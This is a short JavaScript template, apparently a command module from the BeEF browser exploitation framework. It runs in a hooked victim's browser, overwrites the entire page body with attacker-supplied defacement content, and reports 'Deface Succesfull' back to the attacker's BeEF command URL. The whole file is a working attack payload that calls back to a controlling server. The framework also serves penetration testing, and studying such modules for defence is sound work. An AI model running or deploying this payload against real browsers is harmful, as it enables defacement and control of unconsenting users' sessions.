beef.execute(function() {
	document.body.innerHTML = "<%= @deface_content %>";

    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Deface Succesfull");
});
